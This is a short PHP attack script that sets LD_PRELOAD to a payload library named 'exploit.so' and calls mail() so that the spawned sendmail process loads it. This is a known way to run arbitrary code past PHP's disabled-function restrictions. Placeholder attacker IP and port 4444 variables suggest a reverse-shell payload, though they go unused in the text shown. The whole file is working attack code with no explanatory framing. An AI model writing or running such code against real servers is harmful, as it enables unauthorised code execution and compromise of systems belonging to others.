<?php
$ip = 'YOUR_IP_HERE';
$port = 4444;

// This assumes you have a payload in a file named 'exploit.so' on the server
putenv("LD_PRELOAD=/path/to/exploit.so");
mail('nobody@example.com', 'subject', 'message', 'From: sender@example.com', '-bs');
?>
